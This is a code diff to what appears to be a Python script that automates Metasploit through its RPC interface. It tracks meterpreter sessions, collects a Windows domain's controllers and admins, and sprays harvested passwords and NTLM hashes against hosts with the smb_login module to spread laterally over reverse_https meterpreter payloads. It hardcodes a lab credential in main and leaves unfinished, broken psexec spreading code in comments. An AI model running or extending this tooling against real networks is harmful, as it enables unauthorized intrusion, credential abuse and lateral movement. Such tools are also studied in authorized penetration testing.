@@ -63,7 +63,6 @@ def print_great(msg, sess_num):
 def kill_tasks():
     print()
     print_info('Killing tasks then exiting', None)
-    embed()
     del_unchecked_hosts_files()
     for task in asyncio.Task.all_tasks():
         task.cancel()
@@ -208,6 +207,9 @@ async def sess_first_check(client, sess_num):
         NEW_SESS_DATA[sess_num][b'domain'] = domain
         NEW_SESS_DATA[sess_num][b'domain_joined'] = is_domain_joined(shell_info[1], domain)
 
+        # Update DOMAIN_DATA for domain admins and domain controllers
+        await get_DCs_DAs(client, sess_num)
+
         # Get shell privileges
         admin_shell, local_admin = await check_privs(client, sess_num)
 
@@ -217,8 +219,6 @@ async def sess_first_check(client, sess_num):
         if admin_shell == b'ERROR':
             return
 
-        # Update DOMAIN_DATA for domain admins and domain controllers
-        await get_DCs_DAs(client, sess_num)
 
 def parse_pid(output, user, proc):
     for l in output.splitlines():
@@ -337,7 +337,7 @@ async def get_domain_controllers(client, sess_num):
             dc = output.split('Domain Controller: ')[-1].strip()
             if dc not in DOMAIN_DATA['domain_controllers']:
                 DOMAIN_DATA['domain_controllers'].append(dc)
-                print_good('Domain controller: '+dc, sess_num)
+                print_info('Domain controller: '+dc, sess_num)
 
 async def get_domain_admins(client, sess_num, ran_once):
     global DOMAIN_DATA
@@ -367,7 +367,7 @@ async def get_domain_admins(client, sess_num, ran_once):
 
         for x in domain_admins:
             if x not in DOMAIN_DATA['domain_admins']:
-                print_good('Domain admin: '+x, sess_num)
+                print_info('Domain admin: '+x, sess_num)
                 DOMAIN_DATA['domain_admins'].append(x)
 
     # If we don't get any DAs from the shell we try one more time
@@ -570,14 +570,14 @@ def get_console_ids(client):
 
     return c_ids
 
-async def run_msf_module(fut, client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs):
+async def run_msf_module(client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs):
 
     payload = 'windows/meterpreter/reverse_https'
     cmd = create_msf_cmd(mod, rhost_var, target, lhost, payload, extra_opts, start_cmd)
     mod_out = await run_console_cmd(client, c_id, cmd, end_strs)
 
-    #return mod_out
-    fut.set_result(mod_out)
+    return (cmd, mod_out)
+#    fut.set_result((cmd, mod_out))
 
 def create_msf_cmd(module_path, rhost_var, target, lhost, payload, extra_opts, start_cmd):
     cmds = ('use {}\n'
@@ -598,6 +598,10 @@ async def run_console_cmd(client, c_id, cmd, end_strs):
     print_info('Running MSF module [{}]'.format(module), None)
     client.call('console.write',[c_id, cmd])
     output = await get_console_output(client, c_id, end_strs)
+    err = get_output_errors(output, cmd)
+    if err:
+        return
+
     return output
 
 async def get_console_output(client, c_id, end_strs, timeout=30):
@@ -647,12 +651,12 @@ async def get_nonbusy_cid(client, c_ids):
                 return c_id
         asyncio.sleep(1)
 
-async def spread(client, c_ids, lhost):
+async def spread(loop, client, c_ids, lhost):
     global DOMAIN_DATA
 
     for c in DOMAIN_DATA['creds']:
         if c not in DOMAIN_DATA['checked_creds']:
-            # Set up a dict where the key is the creds and the val are the hosts we checked them against
+            # Set up a dict where the key is the creds and the val are the hosts we are admin on
             DOMAIN_DATA['checked_creds'][c] = []
 
             # hash
@@ -665,6 +669,7 @@ async def spread(client, c_ids, lhost):
                     pwd = hash_split[3] # ntlm hash
                 else:
                     continue
+
             # plaintext
             else:
                 cred_split = c.split(':')
@@ -685,13 +690,66 @@ async def spread(client, c_ids, lhost):
 
             c_id = await get_nonbusy_cid(client, c_ids)
             print_info('Spraying credentials [{}] against hosts'.format(user), None)
-            #await run_msf_module(client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs))
-            fut = asyncio.Future()
-            task = asyncio.ensure_future(run_msf_module(fut, client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs))
-            task.add_done_callback(parse_smb_login)
+          #  fut = asyncio.Future()
+          #  asyncio.ensure_future(run_msf_module(fut, client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs))
+          #  fut.add_done_callback(parse_module_output)
 
-def parse_smb_login(fut):
-    output = fut.result()
+            cmd, output = await run_msf_module(client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs)
+            parse_module_output(cmd, output)
+
+#            await run_psexec_psh(client, c_ids, ip, user, pwd)
+
+
+
+#def run_psexec_psh(client, c_ids, ip, user, pwd):
+#
+#    session_ips = []
+#    for sess_num in NEW_SESS_DATA:
+#        for sess_ip in NEW_SESS_DATA[sess_num][b'tunnel_peer'].split(b':')[0]:
+#            session_ips = ip = ip.
+#            session_ips.append(ip)
+#
+#    c_id = await get_nonbusy_cid(client, c_ids)
+#    # DOMAIN_DATA['checked_creds']['creds'] = [list of ips we have admin for those creds]
+#    for c in DOMAIN_DATA['checked_creds']:
+#        for admin_ip in DOMAIN_DATA['checked_creds'][c]:
+#            if admin_ip not in 
+#
+#        for sess_num in NEW_SESS_DATA:
+#            for ip in NEW_SESS_DATA[sess_num][b'tunnel_peer'].split(b':')[0]
+#                if ip not in DOMAIN_DATA['checked_creds'][c]:
+#                    DOMAIN_DATA['checked_creds'][c].append(ip)
+#                    await run_psexec_psh(client, c, ip)
+#
+#    mod = 'auxiliary/scanner/smb/smb_login'
+#    rhost_var = 'RHOST'
+#    start_cmd = 'run'
+#    target = create_hostsfile(c)
+#    extra_opts = ('set smbuser {}\n'
+#                  'set smbpass {}\n'
+#                  'set smbdomain {}'.format(user, pwd, DOMAIN_DATA['domain']))
+#    end_strs = [b'[*] Meterpreter session ']
+#
+#    print_info('Spreading with credentials [{}] against host [{}]'.format(user, ip), None)
+#    fut = asyncio.Future()
+#    asyncio.ensure_future(run_msf_module(fut, client, c_id, mod, rhost_var, target, lhost, extra_opts, start_cmd, end_strs))
+#    fut.add_done_callback(parse_module_output)
+
+
+#def parse_module_output(result):
+#    cmd, output = fut.result()
+#    if output:
+#        if 'smb_login' in cmd:
+#            parse_smb_login(output)
+
+def parse_module_output(cmd, output):
+    if output:
+        if 'smb_login' in cmd:
+            parse_smb_login(output)
+
+def parse_smb_login(output):
+    global DOMAIN_DATA
+
     out_split = output.splitlines()
     admin = False
     user = None
@@ -701,11 +759,19 @@ def parse_smb_login(fut):
             l = l.decode('utf8')
             ip = l.split()[1]
             user = l.split("Success: '")[1]
-            if l.endswith("' Administrator"):
+            admin_str = "' Administrator"
+            if l.endswith(admin_str):
                 admin = True
+                user = user.split(admin_str)[0]
 
             if admin:
+                # IP will only be in there if the creds are admin on the box
+                if ip in DOMAIN_DATA['checked_creds'][user]:
+                    return
+
+                DOMAIN_DATA['checked_creds'][user].append(ip)
                 print_good('Admin login found! {} - {}'.format(ip, user), None)
+
             else:
                 print_info('Non-admin login found {} - {}'.format(ip, user), None)
 
@@ -716,9 +782,7 @@ def create_hostsfile(c):
     filename = 'unchecked_hosts-{}.txt'.format(identifier)
     with open(filename, 'w') as f:
         for ip in DOMAIN_DATA['hosts']:
-            if ip not in DOMAIN_DATA['checked_creds'][c]:
-                DOMAIN_DATA['checked_creds'][c].append(ip)
-                f.write(ip+'\n')
+            f.write(ip+'\n')
 
     return 'file:'+os.getcwd()+'/'+filename
 
@@ -971,7 +1035,7 @@ async def check_for_sessions(client, loop, c_ids, lhost):
                 print_info('Waiting on new meterpreter session', None) 
 
         if DOMAIN_DATA['domain']:
-            await spread(client, c_ids, lhost)
+            asyncio.ensure_future(spread(loop, client, c_ids, lhost))
 
         await asyncio.sleep(1)
 
@@ -1016,11 +1080,17 @@ def parse_hostlist(args):
 
 def main(args):
 
+    DOMAIN_DATA['creds'].append('LAB2\\dan.da:Qwerty1da')#####
+
     if args.hostlist or args.xml:
         parse_hostlist(args)
 
     client = msfrpc.Msfrpc({})
-    client = get_perm_token(client)
+    try:
+        client = get_perm_token(client)
+    except:
+        print_bad('Failed to connect to MSF RPC server, are you sure you have the right password?')
+        sys.exit()
     c_ids = get_console_ids(client)
     lhost = get_local_ip(get_iface())
 
